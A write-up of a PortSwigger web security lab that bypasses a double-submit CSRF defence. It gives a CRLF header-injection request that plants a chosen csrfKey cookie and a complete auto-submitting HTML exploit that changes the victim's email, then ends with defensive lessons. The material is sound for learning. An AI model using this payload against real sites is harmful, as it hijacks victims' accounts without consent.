# Lab: CSRF where token is duplicated in cookie

## Objective

Exploit a CSRF vulnerability where the application uses a double-submit cookie mechanism, but the CSRF token can be injected into the victim's cookie.

## Vulnerability

The application uses a CSRF token in both:

- The `csrf` parameter in the POST request.
- The `csrfKey` cookie.

The server only checks whether these two values match. Because the `csrfKey` cookie can be overwritten through a vulnerable search endpoint, an attacker can choose the token value and make both values identical.

This allows the CSRF protection to be bypassed.

## Steps

### 1. Capture the email change request

Using Burp Suite, intercept the request to:

```http
POST /my-account/change-email
```

The request contains both the session cookie and the CSRF token:

```http
Cookie: session=...; csrfKey=...
```

and:

```http
email=attacker@example.com&csrf=...
```

The important observation is that the `csrf` parameter and `csrfKey` cookie contain the same value.

![Email change request](email-change-request-implementing-insecure-double-submit-defense.png)

### 2. Identify the cookie injection

The application's search functionality can be manipulated to inject a `Set-Cookie` header.

The request can be made similar to:

```http
GET /?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_TOKEN;%20SameSite=None
```

The response sets the attacker-controlled value as the `csrfKey` cookie.

![Search request injecting csrfKey](search-request-to-inject-csrfkey-in-victim-browser.png)

### 3. Verify the injection

The response contains:

```http
Set-Cookie: csrfKey=ATTACKER_TOKEN; SameSite=None; Secure; HttpOnly
```

This confirms that the attacker can control the CSRF cookie.

![Successful injection](injection-can-be-done-successfully.png)

### 4. Create the CSRF exploit

Create an exploit containing an automatically submitted form.

The important part is that the `csrf` parameter uses the same value that will be injected into the victim's `csrfKey` cookie:

```html
<html>
<body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="hidden" name="csrf" value="ATTACKER_TOKEN">
    </form>

    <img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_TOKEN%3b%20SameSite=None"
         onerror="document.forms[0].submit()">
</body>
</html>
```

The image request first causes the vulnerable endpoint to set:

```http
csrfKey=ATTACKER_TOKEN
```

The form then submits:

```http
csrf=ATTACKER_TOKEN
```

Both values therefore match.

![Exploit to change email](exploit-to-change-email.png)

### 5. Deliver the exploit

Store the exploit on the PortSwigger exploit server and use **Deliver exploit to victim**.

When the victim visits the malicious page:

1. The injected request modifies the `csrfKey` cookie.
2. The CSRF form is automatically submitted.
3. The application sees matching CSRF values.
4. The email address is changed.

## Result

The CSRF protection is successfully bypassed because the attacker can control the value of the CSRF cookie and place the same value in the submitted `csrf` parameter.

## Key Learning

- A double-submit cookie defense is ineffective if an attacker can set or overwrite the CSRF cookie.
- CSRF tokens must not be predictable or controllable by an attacker.
- HTTP response header injection can become a CSRF bypass when security-sensitive cookies are affected.
- Both the CSRF token and cookie must be securely generated and protected from attacker-controlled input.
- `SameSite` cookie settings can provide additional protection, but should not replace proper CSRF token validation.
